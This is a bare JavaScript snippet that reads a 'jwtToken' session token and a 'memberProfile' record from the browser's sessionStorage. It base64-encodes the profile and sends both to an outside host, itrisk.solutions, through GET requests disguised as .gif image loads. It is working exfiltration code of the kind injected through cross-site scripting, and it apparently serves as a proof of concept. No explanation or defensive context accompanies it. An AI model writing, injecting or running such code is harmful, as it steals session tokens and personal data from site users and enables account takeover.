var gt = new XMLHttpRequest();
gt.open("GET", "https://itrisk.solutions/token.gif?t=" + sessionStorage.getItem('jwtToken'));
gt.send();
	
var gp = new XMLHttpRequest();
var enc = window.btoa(sessionStorage.getItem('memberProfile'));
gp.open("GET", "https://itrisk.solutions/profile.gif?p=" + enc);
gp.send();
